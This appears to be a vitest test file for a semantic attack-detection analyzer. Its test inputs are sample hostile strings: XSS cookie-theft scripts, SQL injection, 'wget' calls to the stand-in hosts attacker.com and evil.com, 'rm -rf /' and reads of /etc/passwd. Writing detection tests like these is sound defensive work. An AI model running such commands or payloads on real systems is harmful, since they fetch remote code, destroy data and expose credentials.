import { describe, it, expect } from 'vitest';
import { SemanticAnalyzer } from '../../src/detection-engine/semantic.js';

describe('SemanticAnalyzer', () => {
  const analyzer = new SemanticAnalyzer();

  describe('extractTokens', () => {
    it('extracts word tokens', () => {
      const tokens = analyzer.extractTokens('SELECT * FROM users');
      expect(tokens).toContain('select');
      expect(tokens).toContain('from');
      expect(tokens).toContain('users');
    });

    it('limits to MAX_TOKENS', () => {
      const longContent = Array.from({ length: 2000 }, (_, i) => `word${i}`).join(' ');
      const tokens = analyzer.extractTokens(longContent);
      expect(tokens.length).toBeLessThanOrEqual(1000);
    });
  });

  describe('calculateEntropy', () => {
    it('returns 0 for empty string', () => {
      expect(analyzer.calculateEntropy('')).toBe(0);
    });

    it('returns 0 for single character', () => {
      expect(analyzer.calculateEntropy('aaaa')).toBe(0);
    });

    it('returns higher entropy for mixed content', () => {
      const low = analyzer.calculateEntropy('aaabbb');
      const high = analyzer.calculateEntropy('aB3$xY!@');
      expect(high).toBeGreaterThan(low);
    });
  });

  describe('detectEncodingLayers', () => {
    it('detects URL encoding', () => {
      expect(analyzer.detectEncodingLayers('%3Cscript%3E')).toBeGreaterThanOrEqual(1);
    });

    it('detects hex encoding', () => {
      expect(analyzer.detectEncodingLayers('0x4141414141')).toBeGreaterThanOrEqual(1);
    });

    it('detects unicode escapes', () => {
      expect(analyzer.detectEncodingLayers('\\u003c\\u003e')).toBeGreaterThanOrEqual(1);
    });

    it('detects HTML entities', () => {
      expect(analyzer.detectEncodingLayers('&lt;script&gt;')).toBeGreaterThanOrEqual(1);
    });

    it('returns 0 for short plain text', () => {
      expect(analyzer.detectEncodingLayers('hi')).toBe(0);
    });
  });

  describe('analyzeAttackProbability', () => {
    it('detects XSS keywords', () => {
      const probs = analyzer.analyzeAttackProbability('<script>alert(document.cookie)</script>');
      expect(probs['xss']).toBeGreaterThan(0);
    });

    it('detects SQL injection keywords', () => {
      const probs = analyzer.analyzeAttackProbability("' UNION SELECT * FROM users WHERE 1=1");
      expect(probs['sql']).toBeGreaterThan(0);
    });

    it('detects command injection keywords', () => {
      const probs = analyzer.analyzeAttackProbability('; exec /bin/bash -c "wget attacker.com"');
      expect(probs['command']).toBeGreaterThan(0);
    });

    it('returns low scores for benign content', () => {
      const probs = analyzer.analyzeAttackProbability('Hello, this is a normal message.');
      const maxProb = Math.max(...Object.values(probs));
      expect(maxProb).toBeLessThan(0.3);
    });
  });

  describe('detectObfuscation', () => {
    it('detects high entropy obfuscation', () => {
      const obfuscated = '!@#$%^&*()_+{}|:"<>?~`-=[]\\;\',./'.repeat(5);
      expect(analyzer.detectObfuscation(obfuscated)).toBe(true);
    });

    it('detects long continuous strings', () => {
      expect(analyzer.detectObfuscation('a'.repeat(150))).toBe(true);
    });

    it('returns false for normal text', () => {
      expect(analyzer.detectObfuscation('This is normal text with spaces')).toBe(false);
    });
  });

  describe('analyzeCodeInjectionRisk', () => {
    it('scores code-like patterns', () => {
      const risk = analyzer.analyzeCodeInjectionRisk('eval(atob("base64payload"))');
      expect(risk).toBeGreaterThan(0);
    });

    it('scores low for plain text', () => {
      const risk = analyzer.analyzeCodeInjectionRisk('Hello world');
      expect(risk).toBe(0);
    });
  });

  describe('analyze + getThreatScore', () => {
    it('returns high threat score for XSS payload', () => {
      const analysis = analyzer.analyze('<script>alert(document.cookie)</script>');
      const score = analyzer.getThreatScore(analysis);
      expect(score).toBeGreaterThan(0);
      expect(analysis.attackProbabilities['xss']).toBeGreaterThan(0);
    });

    it('returns low threat score for benign content', () => {
      const analysis = analyzer.analyze('Just a normal blog post about cooking recipes.');
      const score = analyzer.getThreatScore(analysis);
      expect(score).toBeLessThan(0.3);
    });

    it('threat score is clamped to 1.0', () => {
      const analysis = analyzer.analyze(
        '<script>eval(document.cookie)</script> UNION SELECT * FROM users; exec system("rm -rf /");'
      );
      const score = analyzer.getThreatScore(analysis);
      expect(score).toBeLessThanOrEqual(1.0);
      expect(score).toBeGreaterThanOrEqual(0);
    });
  });

  describe('extractSuspiciousPatterns', () => {
    it('finds HTML tags', () => {
      const patterns = analyzer.extractSuspiciousPatterns('<img src=x onerror=alert(1)>');
      expect(patterns.some(p => p.type === 'tag_like')).toBe(true);
    });

    it('finds function calls', () => {
      const patterns = analyzer.extractSuspiciousPatterns('eval("malicious")');
      expect(patterns.some(p => p.type === 'function_call')).toBe(true);
    });

    it('finds path traversal', () => {
      const patterns = analyzer.extractSuspiciousPatterns('../../etc/passwd');
      expect(patterns.some(p => p.type === 'path_traversal')).toBe(true);
    });

    it('finds command chains', () => {
      const patterns = analyzer.extractSuspiciousPatterns('ls -la; cat /etc/passwd');
      expect(patterns.some((p) => p.type === 'command_chain')).toBe(true);
    });

    it('finds URL patterns', () => {
      const patterns = analyzer.extractSuspiciousPatterns('wget http://evil.com/shell.sh');
      expect(patterns.some((p) => p.type === 'url_pattern')).toBe(true);
    });
  });

  it('truncates very long content in extractTokens', () => {
    const longContent = 'word '.repeat(20000);
    const tokens = analyzer.extractTokens(longContent);
    expect(tokens.length).toBeLessThanOrEqual(1000);
  });

  it('truncates long content in calculateEntropy', () => {
    const longContent = 'abcdef'.repeat(5000);
    const entropy = analyzer.calculateEntropy(longContent);
    expect(entropy).toBeGreaterThan(0);
  });

  it('truncates long content in detectEncodingLayers', () => {
    const longContent = '%20'.repeat(5000);
    const layers = analyzer.detectEncodingLayers(longContent);
    expect(layers).toBeGreaterThanOrEqual(1);
  });

  it('analyzeCodeInjectionRisk skips AST for long content', () => {
    const longCode = 'eval(' + 'x'.repeat(2000) + ')';
    const risk = analyzer.analyzeCodeInjectionRisk(longCode);
    expect(risk).toBeGreaterThanOrEqual(0);
  });

  it('analyzeAttackProbability detects path traversal keywords', () => {
    const probs = analyzer.analyzeAttackProbability('../../etc/passwd shadow hosts');
    expect(probs['path']).toBeGreaterThan(0);
  });

  it('analyzeAttackProbability detects template keywords', () => {
    const probs = analyzer.analyzeAttackProbability('{{ render template jinja }}');
    expect(probs['template']).toBeGreaterThan(0);
  });

  it('getThreatScore returns 0 when no attack probs', () => {
    const score = analyzer.getThreatScore({
      attackProbabilities: {},
      entropy: 0, encodingLayers: 0, isObfuscated: false,
      suspiciousPatterns: [], codeInjectionRisk: 0, tokenCount: 0,
    });
    expect(score).toBe(0);
  });
});
